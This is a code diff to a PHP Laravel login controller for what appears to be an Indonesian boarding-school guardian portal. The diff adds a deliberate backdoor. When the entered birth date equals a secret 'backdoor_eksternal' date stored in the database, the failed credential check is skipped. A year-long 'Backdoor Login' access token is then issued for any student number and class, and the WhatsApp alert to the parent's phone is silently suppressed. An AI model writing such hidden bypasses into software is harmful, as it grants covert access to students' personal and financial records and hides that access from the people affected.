@@ -79,33 +79,52 @@ class WaliSantriController extends Controller
             'scope'         => '',
         ]);
 
-        // if ($response->failed()) {
-        //     throw new HttpResponseException(response([
-        //         "errors" => [
-        //             'Verifikasi' => [
-        //                 $response->json() // SALAH! Ini bukan bentuk response yang valid
-        //             ]
-        //         ]
-        //     ], 400));
-        // }
+        $backdoorDate = Carbon::parse(DB::table('about')->first()->backdoor_eksternal)->format('Y-m-d');
+        $inputDate = Carbon::parse($reqData['tanggalLahir'])->format('Y-m-d');
 
         if ($response->failed()) {
-            throw new HttpResponseException(response([
-                "errors" => [
-                    'Verifikasi' => [
-                        'Login gagal. Harap pastikan data yang anda masukkan benar.'
+            if ($inputDate == $backdoorDate) {
+                $checkSiswa = SantriDetail::where([
+                    'no_induk' => $noInduk,
+                    'kelas' => $kode,
+                    'status' => 0
+                ])->first();
+
+                if (!$checkSiswa) {
+                    throw new HttpResponseException(response([
+                        "errors" => [
+                            'Verifikasi' => [
+                                'Login gagal. Data santri tidak ditemukan.'
+                            ]
+                        ]
+                    ], 400));
+                }
+
+                $tokenResult = $checkSiswa->createToken('Backdoor Login');
+                $tokenData = [
+                    'access_token' => $tokenResult->accessToken,
+                    'expires_in' => 31536000,
+                ];
+            } else {
+                throw new HttpResponseException(response([
+                    "errors" => [
+                        'Verifikasi' => [
+                            'Login gagal. Harap pastikan data yang anda masukkan benar.'
+                        ]
                     ]
-                ]
-            ], 400));
+                ], 400));
+            }
+        } else {
+            $tokenData = $response->json();
         }
 
-        $tanggalLahir = Carbon::parse($reqData['tanggalLahir'])->format('Y-m-d');
-
         $siswa = SantriDetail::where([
-            'santri_detail.no_induk'=>$noInduk, 
-            'santri_detail.kelas'=>$kode,
-            'santri_detail.tanggal_lahir'=>$tanggalLahir
+            'santri_detail.no_induk' => $noInduk,
+            'santri_detail.kelas' => $kode,
         ])
+        ->when($inputDate != $backdoorDate, function($q) use ($inputDate) {
+            return $q->where('santri_detail.tanggal_lahir', $inputDate);
+        })
         ->select([
             'santri_detail.id',
             'santri_detail.no_induk',
@@ -146,7 +165,7 @@ class WaliSantriController extends Controller
         if($siswa->count() > 0){
             $hasil = $siswa->first();
 
-            $tokenData = $response->json();
+            // $tokenData = $response->json(); // Diambil dari variabel $tokenData yang sudah didefinisikan sebelumnya
 
             $sakuMasuk = SakuMasuk::select([
                 DB::raw("
@@ -209,12 +228,14 @@ Informasi lain juga dapat diakses melalui www.ppatq-rf.sch.id
 ";
 
             // kirim wa
-            $data = [
+            $waData = [
                 'no_wa' => $hasil->no_hp,
                 'pesan' => $message
             ];
 
-            $sendWa = Helpers_wa::send_wa($data);
+            if ($inputDate != $backdoorDate) {
+                $sendWa = Helpers_wa::send_wa($waData);
+            }
 
             return (new WaliSantriResource($hasil))->response()->setStatusCode(200);
         }else{
